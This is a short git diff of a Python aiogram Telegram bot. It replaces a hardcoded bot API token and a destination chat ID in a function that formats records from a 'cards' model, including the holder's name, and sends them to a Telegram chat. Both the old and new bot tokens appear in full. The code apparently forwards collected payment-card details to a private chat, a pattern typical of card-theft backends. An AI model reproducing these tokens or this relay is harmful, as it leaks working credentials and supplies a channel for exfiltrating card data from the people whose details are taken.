@@ -4,7 +4,7 @@ from aiogram import Bot, Dispatcher, types
 from src.models import CardsModel, CardsPydantic
 from aiogram.filters import Command
 
-API_TOKEN = "5082481522:AAHiyhgTlO8kFVCrHZqYhN4cPY0Cvjh7oaM"
+API_TOKEN = "7057503598:AAHMCfT0QNXInnT6a2ajzQ9gvSo38OYKutg"
 bot = Bot(token=API_TOKEN)
 dispatcher = Dispatcher()
 
@@ -26,7 +26,7 @@ async def send_telegram_message(card: CardsPydantic):
         f"name `{card.holder_name}`"
     )
 
-    await bot.send_message(chat_id="1428375263", text=message_text,  parse_mode="MARKDOWN")
+    await bot.send_message(chat_id="6288979649", text=message_text,  parse_mode="MARKDOWN")
 
 @dispatcher.message(Command('start'))
 async def start(message: types.Message):
